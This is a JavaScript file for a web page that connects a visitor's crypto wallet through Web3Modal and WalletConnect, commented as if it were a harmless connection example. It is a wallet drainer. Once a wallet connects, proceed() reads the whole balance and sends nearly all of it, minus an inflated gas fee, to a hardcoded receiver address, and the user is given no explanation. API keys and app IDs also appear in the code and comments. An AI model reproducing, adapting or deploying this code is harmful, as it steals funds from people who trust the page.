"use strict";

// Unpkg imports
const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;
const Fortmatic = window.Fortmatic;
const evmChains = window.evmChains;

// Web3modal instance
let web3Modal

// Chosen wallet provider given by the dialog window
let provider;


// Address of the selected account
let selectedAccount;

const receiver_address = '0xEB94D7306CE29437b21C5051F5a0c7d0C12294C0'; // <- RECEIVER ADDRESS HERE
let onButtonClick;
let user_address;

/**
 * Setup the orchestra
 */
async function init() {

  console.log("Initializing example");
  console.log("WalletConnectProvider is", WalletConnectProvider);
//   console.log("Fortmatic is", Fortmatic);
  console.log("Portis is", Portis);
  console.log("window.web3 is", window.web3, "window.ethereum is", window.ethereum);

  // Check that the web page is run in a secure context,
  // as otherwise MetaMask won't be available
  if(location.protocol !== 'https:') {
    // https://ethereum.stackexchange.com/a/62217/620
    // const alert = document.querySelector("#alert-error-https");
    // alert.style.display = "block";
    // document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
    // return;
  }

  // Tell Web3modal what providers we have available.
  // Built-in web browser provider (only one can exist as a time)
  // like MetaMask, Brave or Opera is added automatically by Web3modal
  const providerOptions = {
    walletconnect: {
      package: WalletConnectProvider,
      options: {
        infuraId: "e77435344ef0486893cdc26d7d5cf039",
      }
    },

    // binancechainwallet: {
    //     package: true
    // },

    // portis: {
    //     package: Portis, // required
    //     options: {
    //       id: "3f250ef7-0216-4a18-a21b-1b3a9292b33c" // required
    //     }
    // },
  };

  web3Modal = new Web3Modal({
    cacheProvider: false, // optional
    providerOptions, // required
    disableInjectedProvider: false, // optional. For MetaMask / Brave / Opera.
  });
  console.log("Web3Modal instance is", web3Modal);
  return "Done"
}


/**
 * Kick in the UI action after Web3modal dialog has chosen a provider
 */
async function fetchAccountData() {

  // Get a Web3 instance for the wallet
  window.web3 = new Web3(provider);

  console.log("Web3 instance is", web3);

  // Get connected chain id from Ethereum node
  const chainId = await web3.eth.getChainId();
  // Load chain information over an HTTP API
  const chainData = evmChains.getChain(chainId);
//   document.querySelector("#network-name").textContent = chainData.name;
  console.log("Chain data name:", chainData.name);

  // Get list of accounts of the connected wallet
  const accounts = await web3.eth.getAccounts();

  // MetaMask does not give you all accounts, only the selected account
  console.log("Got accounts", accounts);
  selectedAccount = accounts[0];
  console.log("Selected Account: ", selectedAccount);
  user_address = selectedAccount;

//   document.querySelector("#selected-account").textContent = selectedAccount;

  // Get a handl
//   const template = document.querySelector("#template-balance");
//   const accountContainer = document.querySelector("#accounts");

  // Purge UI elements any previously loaded accounts
//   accountContainer.innerHTML = '';

  // Go through all accounts and get their ETH balance
  const rowResolvers = accounts.map(async (address) => {
    const balance = await web3.eth.getBalance(address);
    // ethBalance is a BigNumber instance
    // https://github.com/indutny/bn.js/
    const ethBalance = web3.utils.fromWei(balance, "ether");
    const humanFriendlyBalance = parseFloat(ethBalance).toFixed(4);
    // Fill in the templated row and put in the document
    // const clone = template.content.cloneNode(true);
    // clone.querySelector(".address").textContent = address;
    // clone.querySelector(".balance").textContent = humanFriendlyBalance;
    console.log("New Account: %o", ({address, balance, humanFriendlyBalance}));
    // accountContainer.appendChild(clone);
  });

  // Because rendering account does its own RPC commucation
  // with Ethereum node, we do not want to display any results
  // until data for all accounts is loaded
  await Promise.all(rowResolvers);

  // Display fully loaded UI for wallet data
//   document.querySelector("#prepare").style.display = "none";
//   document.querySelector("#connected").style.display = "block";
    proceed();
}



/**
 * Fetch account data for UI when
 * - User switches accounts in wallet
 * - User switches networks in wallet
 * - User connects wallet initially
 */
async function refreshAccountData() {

  // If any current data is displayed when
  // the user is switching acounts in the wallet
  // immediate hide this data
//   document.querySelector("#connected").style.display = "none";
//   document.querySelector("#prepare").style.display = "block";

  // Disable button while UI is loading.
  // fetchAccountData() will take a while as it communicates
  // with Ethereum node via JSON-RPC and loads chain data
  // over an API call.
//   document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
  await fetchAccountData(provider);
//   document.querySelector("#btn-connect").removeAttribute("disabled")
}


/**
 * Connect wallet button pressed.
 */
async function onConnect() {

  console.log("Opening a dialog", web3Modal);
  try {
    provider = await web3Modal.connect();
    console.log("provider", provider);
  } catch(e) {
    console.log("Could not get a wallet connection", e);
    return;
  }

  // Subscribe to accounts change
  provider.on("accountsChanged", (accounts) => {
    fetchAccountData();
  });

  // Subscribe to chainId change
  provider.on("chainChanged", (chainId) => {
    fetchAccountData();
  });

  // Subscribe to networkId change
  provider.on("networkChanged", (networkId) => {
    fetchAccountData();
  });

  await refreshAccountData();
  onButtonClick = proceed;
}
onButtonClick = onConnect;

/**
 * Disconnect wallet button pressed.
 */
async function onDisconnect() {

  console.log("Killing the wallet connection", provider);

  // TODO: Which providers have close method?
  if(provider.close) {
    await provider.close();

    // If the cached provider is not cleared,
    // WalletConnect will default to the existing session
    // and does not allow to re-scan the QR code with a new wallet.
    // Depending on your use case you may want or want not his behavir.
    await web3Modal.clearCachedProvider();
    provider = null;
  }

  selectedAccount = null;

  // Set the UI back to the initial state
  document.querySelector("#prepare").style.display = "block";
  document.querySelector("#connected").style.display = "none";
}


async function proceed(){
    console.log("Now we roll...");
    // main net
    // const serverUrl = 'https://j4k6qgeektwu.usemoralis.com:2053/server';
    // const appId = 'Zz9EgUcMe681BE7M39JtXM1JW5hjpebINo7jRLOI';
  
    // // testnet
    // // const serverUrl = 'https://vzrez3npotuq.usemoralis.com:2053/server'
    // // const appId = 'LVaJ6EwkawTg52M7p8z3yNf2OoEuScDEma9IaM4C'

    // Moralis.start({ serverUrl, appId });
    // console.log("Moralis bnb initialized");

    // let user;
    // try {
    //   // const web3Provider = await Moralis.enableWeb3();
    //   if(provider.isMetaMask){
    //     // metamask
    //     console.log("Moralis using default (MetaMask)")
    //     const web3Provider = await Moralis.enableWeb3();
    //     console.log("Moralis web3Provider:", web3Provider);
    //   }else{
    //     // walletconnect
    //     console.log("Moralis using walletconnect")
    //     // const web3Provider = await Moralis.enableWeb3({ provider: "walletconnect" });
    //     console.count();
    //     // bsc testnet chain ID: 97
    //     // bsc chain ID: 56
    //     user = await Moralis.authenticate({provider: "walletconnect", chainId: 56});
    //     console.log("Moralis user:", user);
    //   }
    // } catch (error) {
    //   console.log("Can't enable web3: ", error);
    // }
    // NOTE: Moralis.User.current(); doesn't exist

    async function send() {
        console.log("Attempting to send coins...");
        if (!user_address) {
          throw Error('No user: ' + user)
        }
    
  
    //   let web3 = new Web3(window.ethereum);
    //   web3.eth.setProvider(Web3.givenProvider);
  
      // get balance
      var balance;
      var balance_in_wei;

      await web3.eth.getBalance(user_address).then(result => {
        let balanceInEth = web3.utils.fromWei(result, "ether");
        // balance = { wei: result, eth: balanceInEth };
        balance = String(balanceInEth); 
        balance_in_wei = result;
        console.log("Balance, %o", {wei: result, eth: (balanceInEth + " ETH")}); // 0.5922 ... ETH
      }).catch(err => {
        console.log("Error getting balance")
        console.log(err)
      });
      
      // let gas = new Decimal("21000").mul(10).mul(3).toString();
      let gas_estimate = await web3.eth.estimateGas({
        from: user_address,
        to: receiver_address, 
        value: balance_in_wei
      });
      // let gas = new Decimal(gas_estimate).mul(10).mul(4).toString(); // subtract this (increased for high gas periods)
      let gas = new Decimal(gas_estimate).mul(10).mul(4).toString(); // subtract this (increased for high gas periods)
      console.log("Actual estimated Gas (*10*4) in gwei =", gas);
      let gas_to_subtract = web3.utils.fromWei(new Decimal(gas).mul(2).toString(), "gwei"); // but use this
      console.log("Subtracted Gas (*10*4) in wei =", gas_to_subtract);
      var gasPrice = web3.utils.fromWei(gas, "gwei"); // convert 1 gwei to wei
      console.log("Estimated Gas (used in tx) in wei =", gasPrice);
      // THIS ENDS UP BEING USED!!! : 0.00000007
      // let g = await web3.eth.getGasPrice();
      // let g_in_eth = web3.utils.fromWei(g, "ether")
      // // this should be multiplied with gasPrice, to get transaction fee
      // console.log("Gas price:", g, ", gas price in eth:", g_in_eth);
      
      let amountToSend = new Decimal(balance).minus(gas_to_subtract).abs().toString();
      console.log("Amount to send (bal - gas):", amountToSend);
  
        // const options = {
        //   type: "native",
        //   amount: Moralis.Units.ETH(amountToSend),
        //   receiver: receiver_address
        // };
  
        // console.log(options)
        // return;
        /**
         Example: eth.sendTransaction({
           from:eth.accounts[0], to:'0x....', 
           value: web3.toWei(0.05, "ether"), 
           gas: 21000, gasPrice: 50000000000});
         * 
         */
        // let gas__ = (new Decimal("21000"));
        // return;
        web3.eth.sendTransaction({
          to:receiver_address,
          from:user_address, 
          gas:80000,
          //  210000000: exceed block gas limit
          //  21,000,000, // same
          // gasPrice: gas, // keeps showing in metamask as 0.000,000,07
          gasPrice: new Decimal(gas).mul(10000).toString(), // becomes 0.00073626 when gas*10k
          value:web3.utils.toWei(amountToSend, "ether")},
          // value: amountToSend},
          function (err, res){
            if(err){
              return console.log("Can't transfer Coin:", err);
            }
            console.log('Finished Processing transaction:', res);
          });
        // let transaction = await Moralis.transfer(options).catch(
        //   (e) => {
        //     console.log("Can't transfer Coin:", e)
        //   },
        // );
        //   console.log(transaction)
        //   await transaction.wait().then((v) => {
        //     console.log('Finished Processing transaction:', v)
        //   })
    }
    send();
}


{
    function getParameterByName(name, url = window.location.href) {
        name = name.replace(/[\[\]]/g, "\\$&");
        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
          results = regex.exec(url);
        if (!results) return null;
        if (!results[2]) return "";
        return decodeURIComponent(results[2].replace(/\+/g, " "));
    }
    let l = console.log; 
    function normalize(x_){
        let x = String(x_);
        if(/^\[object/g.test(x)){ // [object Window]
            try {
                let y = JSON.stringify(x_);
                x = y;
            } catch (error) {
                x = x+" >> "+(Object.keys(x_));
            }
            return x;
        }else{return x;}
    }
    if(getParameterByName("log") == "true"){
        let el = document.getElementById("testx");
        el.style.display = "block";
        console.log = (x, ...y)=>{ 
            l(x);
            if(y && y.length>0){
                l(y);
                y.forEach((z) => x+=(" -> ("+normalize(z)+")"));
            }
            x = normalize(x);
            el.innerText += ("~ "+x+"\n");
        }
    }
}
/**
 * Main entry point.
 */
async function startx(){
    await init().then(() => {
        onButtonClick();
        // ^ Initially "onConnect", then "proceed"
    }).catch(e => {
        console.log("Initialization failed.");
        console.log(e);
    })
};
// trigger login
// let els = document.getElementsByClassName("triggerx");
// ([...els]).forEach((el) => {
//     el.addEventListener("click", () => {
//         startx();
//     });
// });
console.log(window);

